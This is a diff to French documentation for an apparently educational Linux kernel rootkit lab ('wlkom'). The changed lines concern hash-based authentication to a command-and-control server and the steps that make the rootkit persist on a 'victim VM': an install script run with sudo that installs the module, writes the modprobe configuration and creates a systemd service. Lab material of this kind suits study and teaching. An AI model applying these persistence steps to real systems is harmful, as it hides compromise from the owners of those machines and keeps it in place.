@@ -32,7 +32,7 @@ Le protocole d'authentification utilise FNV-1a 32-bit. Le C2 reçoit le mot de p
 AUTH <hash_fnv1a>
 ```
 
-Le module kernel ne reçoit pas le mot de passe brut : il reçoit `password_hash=<hash_fnv1a>` au chargement. En mode manuel, la valeur peut être passée à `insmod`; en mode persistant, elle est écrite dans `/etc/modprobe.d/wlkom.conf` puis transmise automatiquement par `modprobe wlkom` via `wlkom.service`. Le module compare deux chaînes hexadécimales. Cette solution évite le secret hardcodé et évite de le comparer directement en clair côté kernel. FNV-1a n'est pas cryptographiquement sûr ; il a été choisi ici pour rester autonome, court, reproductible en C userland et facile à vérifier dans le cadre pédagogique.
+Le module kernel ne reçoit pas le mot de passe brut : il reçoit `password_hash=<hash_fnv1a>` au chargement. En mode manuel, la valeur peut être passée à `insmod`; en mode persistant, l'installateur demande le mot de passe, calcule FNV-1a, écrit le hash dans `/etc/modprobe.d/wlkom.conf`, puis `modprobe wlkom` le transmet automatiquement via `wlkom.service`. Le module compare deux chaînes hexadécimales. Cette solution évite le secret hardcodé et évite de le comparer directement en clair côté kernel. FNV-1a n'est pas cryptographiquement sûr ; il a été choisi ici pour rester autonome, court, reproductible en C userland et facile à vérifier dans le cadre pédagogique.
 
 ---
 
@@ -125,7 +125,7 @@ Le rootkit doit survivre à un reboot **et** se reconnecter au C2.
 
 ### Approche A — Systemd service ✅ Recommandé
 
-Le repo fournit `rootkit/install_persistence.sh`, à lancer sur la VM victime après compilation du module. Il installe `wlkom.ko`, écrit la configuration `modprobe`, crée le service systemd et l'active au boot. Le service utilise `modprobe` plutôt qu'`insmod`, afin de récupérer automatiquement les paramètres depuis `/etc/modprobe.d/wlkom.conf`.
+Le repo fournit `rootkit/install_persistence.sh`, à lancer sur la VM victime après compilation du module. Il demande le mot de passe en interactif, calcule son hash FNV-1a, installe `wlkom.ko`, écrit la configuration `modprobe`, crée le service systemd et l'active au boot. Le service utilise `modprobe` plutôt qu'`insmod`, afin de récupérer automatiquement les paramètres depuis `/etc/modprobe.d/wlkom.conf`.
 
 Créer `/etc/systemd/system/wlkom.service` :
 
@@ -148,7 +148,7 @@ WantedBy=multi-user.target
 ```bash
 cd /mnt/vmshare/rootkit
 make
-sudo ./install_persistence.sh <password_hash> 192.168.100.10 4444
+sudo ./install_persistence.sh 192.168.100.10 4444
 sudo systemctl start wlkom.service
 ```
 
